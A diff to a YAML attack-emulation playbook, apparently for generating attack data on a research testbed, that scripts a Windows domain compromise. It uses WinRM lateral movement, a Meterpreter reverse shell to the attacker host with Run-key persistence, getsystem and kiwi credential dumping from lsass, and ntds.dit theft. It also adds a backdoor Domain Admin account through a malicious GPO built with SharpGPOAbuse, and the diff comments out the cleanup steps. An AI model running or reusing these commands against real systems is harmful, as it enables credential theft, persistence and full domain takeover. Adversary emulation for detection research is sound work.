@@ -18,7 +18,7 @@ commands:
     creates_session: winrm_domain_user
     interactive: true
     metadata:
-      techniques: "T1021.006, T1047"
+      techniques: "T1021.006"
       tactics: "Lateral Movement"
       technique_name: "Remote Services: Windows Remote Management"
 
@@ -27,7 +27,7 @@ commands:
     interactive: true
     cmd: "Add-Content -Path \"C:\\Scripts\\Logger.ps1\" -Value \"net localgroup administrators alice /add\"\n"
     metadata:
-      techniques: "T1053.005, T1547"
+      techniques: "T1053.005"
       tactics: "Execution, Persistence, Privilege Escalation"
       technique_name: "Scheduled Task/Job: Scheduled Task"
 
@@ -40,17 +40,17 @@ commands:
         LHOST: $IP_KALI
         LPORT: "9001"
     format: exe
-    local_path: $PAYLOADS_DIR/msf.exe
+    local_path: $PAYLOADS_DIR/msfshell.exe
 
   - type: shell
     session: winrm_domain_user
     interactive: true
-    cmd: "upload $PAYLOADS_DIR/msf.exe C:\\\\Users\\\\Public\\\\msf.exe\n"
+    cmd: "upload $PAYLOADS_DIR/msfshell.exe C:\\\\Users\\\\Public\\\\msfshell.exe\n"
 
   - type: shell
     session: winrm_domain_user
     interactive: true
-    cmd: "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Persistence\" -Value \"C:\\Users\\Public\\msf.exe\" -PropertyType \"String\" -Force\n"
+    cmd: "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Persistence\" -Value \"C:\\Users\\Public\\msfshell.exe\" -PropertyType \"String\" -Force\n"
     metadata:
       techniques: "T1547.001"
       tactics: "Persistence, Privilege Escalation"
@@ -69,7 +69,7 @@ commands:
   - type: shell
     session: winrm_domain_user
     interactive: true
-    cmd: "C:\\Users\\Public\\msf.exe\n"
+    cmd: "C:\\Users\\Public\\msfshell.exe\n"
 
   - type: msf-session
     session: msfshell_local_admin
@@ -77,15 +77,15 @@ commands:
 
   - type: msf-session
     session: msfshell_local_admin
-    cmd: getsystem
+    cmd: "getsystem"
 
   - type: msf-session
     session: msfshell_local_admin
-    cmd: getuid
+    cmd: "getuid"
 
   - type: msf-session
     session: msfshell_local_admin
-    cmd: pgrep lsass
+    cmd: "pgrep lsass"
 
   - type: setvar
     cmd: $RESULT_STDOUT
@@ -104,11 +104,11 @@ commands:
 
   - type: msf-session
     session: msfshell_local_admin
-    cmd: getpid
+    cmd: "getpid"
 
   - type: msf-session
     session: msfshell_local_admin
-    cmd: load kiwi
+    cmd: "load kiwi"
 
   - type: msf-session
     session: msfshell_local_admin
@@ -163,7 +163,7 @@ commands:
     creates_session: winrm_domain_admin
     interactive: true
     metadata:
-      techniques: "T1021.006, T1047"
+      techniques: "T1021.006"
       tactics: "Lateral Movement"
       technique_name: "Remote Services: Windows Remote Management"
 
@@ -176,36 +176,6 @@ commands:
     session: winrm_domain_admin
     interactive: true
     cmd: "$Username = \"$COMPROMISED_ADMIN_USERNAME\"; $Password = \"$COMPROMISED_ADMIN_PASSWORD\"; $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); $Session = New-PSSession -ComputerName DC1 -Credential $Credential;\n"
-
-  - type: shell
-    session: winrm_domain_admin
-    interactive: true
-    cmd: "Copy-Item -Path C:\\Users\\Public\\SharpGPOAbuse.exe -ToSession $Session -Destination C:\\Users\\Public;\n"
-
-    # Arguments in SharpGPOAbuse seem to be limited in length
-    # Write payload to a PowerShell script instead
-  - type: shell
-    session: winrm_domain_admin
-    interactive: true
-    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Write-Output \"New-ADUser -Name $BACKDOOR_NAME -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1\" > C:\\Users\\Public\\adduser.ps1; Write-Output \"Add-ADGroupMember -Identity 'Domain Admins' -Members $BACKDOOR_NAME\" >> C:\\Users\\Public\\adduser.ps1; }\n"
-
-    # Generate a random backdoor GPO name so we can run the playbook multiple times
-    # without having to worry about duplicate GPO names if it is not removed
-  - type: shell
-    cmd: tr -dc A-Za-z0-9 </dev/urandom | head -c 10
-
-  - type: setvar
-    cmd: $RESULT_STDOUT
-    variable: $BACKDOOR_NAME
-
-  - type: shell
-    session: winrm_domain_admin
-    interactive: true
-    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { New-GPO -Name \"$BACKDOOR_NAME\"; New-GPLINK -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com'; C:\\Users\\Public\\SharpGPOAbuse.exe --AddComputerTask --GPOName $BACKDOOR_NAME --Author $COMPROMISED_ADMIN_USERNAME --TaskName \"$BACKDOOR_NAME\" --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\\Users\\Public\\adduser.ps1'; gpupdate /force }\n"
-    metadata:
-      techniques: "T1484.001"
-      tactics: "Defense Evasion, Privilege Escalation"
-      technique_name: "Domain or Tenant Policy Modification: Group Policy Modification"
 
   - type: shell
     session: winrm_domain_admin
@@ -257,20 +227,50 @@ commands:
     # This does not generate logs however
     # Just write a debug message to save some time
   - type: debug
-    cmd: Decrypting ntds.dit offline ...
+    cmd: "Decrypting ntds.dit offline ..."
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Copy-Item -Path C:\\Users\\Public\\SharpGPOAbuse.exe -ToSession $Session -Destination C:\\Users\\Public;\n"
+
+    # Generate a random backdoor GPO name so we can run the playbook multiple times
+    # without having to worry about duplicate GPO names if it is not removed
+  - type: shell
+    cmd: tr -dc A-Za-z0-9 </dev/urandom | head -c 10
+
+  - type: setvar
+    cmd: $RESULT_STDOUT
+    variable: $BACKDOOR_NAME
+
+    # Arguments in SharpGPOAbuse seem to be limited in length
+    # Write payload to a PowerShell script instead
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Write-Output \"New-ADUser -Name $BACKDOOR_NAME -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1\" > C:\\Users\\Public\\adduser.ps1; Write-Output \"Add-ADGroupMember -Identity 'Domain Admins' -Members $BACKDOOR_NAME\" >> C:\\Users\\Public\\adduser.ps1; }\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { New-GPO -Name \"$BACKDOOR_NAME\"; New-GPLINK -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com'; C:\\Users\\Public\\SharpGPOAbuse.exe --AddComputerTask --GPOName $BACKDOOR_NAME --Author $COMPROMISED_ADMIN_USERNAME --TaskName \"$BACKDOOR_NAME\" --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\\Users\\Public\\adduser.ps1'; gpupdate /force }\n"
+    metadata:
+      techniques: "T1484.001"
+      tactics: "Defense Evasion, Privilege Escalation"
+      technique_name: "Domain or Tenant Policy Modification: Group Policy Modification"
 
     # Optional: Cleanup DC1
-  - type: shell
-    session: winrm_domain_admin
-    interactive: true
-    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Remove-GPLink -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; Remove-GPO -Name \"$BACKDOOR_NAME\" -Confirm:0; Remove-Item C:\\Users\\Public\\*.* -Force }\n"
+#  - type: shell
+#    session: winrm_domain_admin
+#    interactive: true
+#    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Remove-GPLink -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; Remove-GPO -Name \"$BACKDOOR_NAME\" -Confirm:0; Remove-Item C:\\Users\\Public\\*.* -Force }\n"
 
     # Optional: Cleanup WEB
-  - type: shell
-    session: winrm_domain_admin
-    interactive: true
-    cmd: "Remove-Item C:\\Users\\Public\\*.* -Force\n"
+#  - type: shell
+#    session: winrm_domain_admin
+#    interactive: true
+#    cmd: "Remove-Item C:\\Users\\Public\\*.* -Force\n"
 
     # Optional: Cleanup KALI
-  - type: shell
-    cmd: rm *.hive *.dit
+#  - type: shell
+#    cmd: rm *.hive *.dit
